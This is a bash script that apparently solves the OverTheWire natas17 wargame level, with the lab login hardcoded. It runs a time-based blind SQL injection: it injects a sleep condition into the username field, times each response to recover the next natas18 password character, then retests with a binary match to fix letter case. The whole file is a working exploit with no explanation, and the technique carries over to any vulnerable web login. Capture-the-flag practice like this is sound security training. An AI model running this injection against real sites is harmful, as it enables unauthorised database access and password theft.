#!/bin/bash

val=$1
done=false

for i in {a..z}; do
	start=$(date +%s)
	response=$(curl -s -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx -d "username=natas18\" and if(password like \"$val$i%\", sleep(3), 1) -- " -d "debug" "http://natas17.natas.labs.overthewire.org")
	end=$(date +%s)
	if (( end - start >= 3 )); then
		start=$(date +%s)
		response=$(curl -s -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx -d "username=natas18\" and if(password like binary \"$val$i%\", sleep(3), 1) -- " -d "debug" "http://natas17.natas.labs.overthewire.org")
		end=$(date +%s)
		if (( end - start >= 3 )); then
			echo $i
		else
			echo "$i" | tr '[:lower:]' '[:upper:]'
		fi
		done=true
		break
	fi
done

for i in {0..9}; do
	if [[ $done == false ]]; then
        	start=$(date +%s)
        	response=$(curl -s -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx -d "username=natas18\" and if(password like \"$val$i%\", sleep(3), 1) -- " -d "debug" "http://natas17.natas.labs.overthewire.org")
        	end=$(date +%s)
		if (( end - start >= 3 )); then
			echo $i
		fi
        fi
done

